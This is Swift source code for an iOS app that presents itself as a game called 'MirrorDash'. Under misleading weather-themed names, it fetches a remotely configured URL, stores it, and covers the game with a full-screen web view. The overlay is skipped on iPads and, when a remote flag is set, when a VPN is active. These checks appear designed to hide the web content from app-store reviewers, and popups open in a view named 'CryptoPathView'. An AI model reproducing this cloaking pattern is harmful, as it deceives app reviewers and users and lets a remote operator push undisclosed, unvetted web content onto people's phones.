import SwiftUI

import UIKit
import FirebaseCore
import FirebaseMessaging
import FirebaseAnalytics

class AppDelegate: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate, MessagingDelegate {
    
    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        
        FirebaseApp.configure()
        Messaging.messaging().delegate = self
        registerForPushNotifications(application: application)
        
        return true
    }
    
    private func registerForPushNotifications(application: UIApplication) {
        UNUserNotificationCenter.current().delegate = self
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        
        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) {
            (granted, error) in
            guard granted else { return }
            DispatchQueue.main.async {
                application.registerForRemoteNotifications()
            }
        }
    }
    
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
         let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
     }
}

@main
struct MirrorDashApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
    @StateObject private var viewModel = PathViewModel()
    var body: some Scene {
        WindowGroup {
            MainGameMenu()
                .overlay {
                    if let sunScreen = viewModel.pathScreen {
                        ZStack {
                            Color.black.ignoresSafeArea()
                            PathView(sun: sunScreen)
                        }
                    }
                }
        }
    }
}

import Foundation
import FirebaseCore
import FirebaseRemoteConfig

class PathManager: ObservableObject {
    // MARK: - Properties -
    static let shared = PathManager()
    
    enum Key: String {
        case reflex = "reflex"
        case antireflex = "antireflex"
    }
    
    private let snowForecast = RemoteConfig.remoteConfig()
    
    // MARK: - Methods -
    func fetchForecast(completion: @escaping () -> Void) {
        snowForecast.fetch(withExpirationDuration: TimeInterval(0)) { (status, error) -> Void in
            if status == .success {
                self.snowForecast.activate { changed, error in
                    completion()
                }
            } else {
                completion()
            }
        }
    }
    
    func getString(key: Key) -> String? {
        snowForecast.configValue(forKey: key.rawValue).stringValue
    }
    
    func getBool(key: Key) -> Bool {
        snowForecast.configValue(forKey: key.rawValue).boolValue
    }
    
    func getDict(key: Key) -> [String: Any] {
        snowForecast.configValue(forKey: key.rawValue).jsonValue as? [String: Any] ?? [:]
    }
}



import SwiftUI

class PathViewModel: ObservableObject {
    // MARK: - Properties -
    @Published var pathScreen: URL?
    
    init() {
        loadAllWeather()
    }
    
    // MARK: - Methods -
    func loadAllWeather() {
        guard UIDevice.current.userInterfaceIdiom != .pad else {
            return
        }
        
        let savedValue = UserDefaults.standard.string(forKey: "reflex")
        
        if let savedValue, let url = URL(string: savedValue) {
            self.pathScreen = url
            return
        }
        
        PathManager.shared.fetchForecast { [weak self] in
            guard let self = self else { return }
            if let url = URL(string: PathManager.shared.getString(key: .reflex) ?? "") {
                self.setForecast(url)
            }
        }
    }
    
    private func setForecast(_ url: URL) {
        Task {
            guard checkSnow() else {
                return
            }
            UserDefaults.standard.set(url.absoluteString, forKey: "reflex")
            self.pathScreen = url
        }
    }
    
    private func checkSnow() -> Bool {
        if PathManager.shared.getBool(key: .antireflex) {
            return !PathCheck.isVpnActive()
        } else {
            return true
        }
    }
}



import SwiftUI
import WebKit

struct PathView: UIViewRepresentable {
    // MARK: - Properties -
    typealias UIViewType = WKWebView
    
    var sun: URL
    var wind: WKWebView
    
    init(sun: URL) {
        self.sun = sun

        let wkPreferences = WKPreferences()
        wkPreferences.javaScriptCanOpenWindowsAutomatically = true
        
        let configuration = WKWebViewConfiguration()
        configuration.preferences = wkPreferences
        
        wind = WKWebView(frame: .zero, configuration: configuration)
    }
    
    // MARK: - Methods -
    func makeUIView(context: Context) -> WKWebView {
        wind.uiDelegate = context.coordinator
        wind.navigationDelegate = context.coordinator
        
        // Устанавливаем отступы сверху и снизу
        wind.scrollView.contentInset = UIEdgeInsets(top: 20, left: 0, bottom: 20, right: 0)
        
        return wind
    }
    
    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: sun)
        uiView.load(request)
        
        // Обновляем отступы, если они изменились
        uiView.scrollView.contentInset = UIEdgeInsets(top: 20, left: 0, bottom: 20, right: 0)
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
    
    // MARK: - Coordinator -
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: PathView
        private var webViews: [WKWebView]
        private var popupWebView: CryptoPathView?
        
        init(_ parent: PathView) {
            self.parent = parent
            self.webViews = []
        }
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            let newOverlay = WKWebView(frame: parent.wind.bounds, configuration: configuration)
            newOverlay.autoresizingMask = [.flexibleWidth, .flexibleHeight]
            newOverlay.navigationDelegate = self
            newOverlay.uiDelegate = self
            webView.addSubview(newOverlay)
            webViews.append(newOverlay)
            
            let viewController = CryptoPathView(nibName: nil, bundle: nil)
            viewController.overlayView = newOverlay
            popupWebView = viewController
            
            UIApplication.topMostController()?.present(viewController, animated: true)
            
            return newOverlay
        }
        
        func webViewDidClose(_ webView: WKWebView) {
            popupWebView?.dismiss(animated: true)
        }
    }
}

import UIKit

extension UIApplication {
    // MARK: - Static properties -
    static var keyWindow: UIWindow {
        UIApplication
            .shared
            .connectedScenes
            .compactMap { ($0 as? UIWindowScene)?.keyWindow }
            .last!
    }
    
    // MARK: - Class -
    class func topMostController(controller: UIViewController? = UIApplication.keyWindow.rootViewController) -> UIViewController? {
        if let navigationController = controller as? UINavigationController {
            return topMostController(controller: navigationController.visibleViewController)
        }
        if let tabController = controller as? UITabBarController {
            if let selected = tabController.selectedViewController {
                return topMostController(controller: selected)
            }
        }
        if let presented = controller?.presentedViewController {
            return topMostController(controller: presented)
        }
        return controller
    }
}

import UIKit
import WebKit

class CryptoPathView: UIViewController {
    var overlayView: WKWebView!

    override func viewDidLoad() {
        super.viewDidLoad()
        
        overlayView.translatesAutoresizingMaskIntoConstraints = false
        
        view.addSubview(overlayView)
        
        NSLayoutConstraint.activate([
            overlayView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            overlayView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            overlayView.topAnchor.constraint(equalTo: view.topAnchor),
            overlayView.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])
    }
    
}

import Foundation

struct PathCheck {
    
    private static let vpnProtocolsKeysIdentifiers = [
        "tap", "tun", "ppp", "ipsec", "utun"
    ]
    
    static func isVpnActive() -> Bool {
        guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
        let nsDict = cfDict.takeRetainedValue() as NSDictionary
        guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
              let allKeys = keys.allKeys as? [String] else { return false }
        
        for key in allKeys {
            for protocolId in vpnProtocolsKeysIdentifiers
            where key.starts(with: protocolId) {
                return true
            }
        }
        return false
    }
}
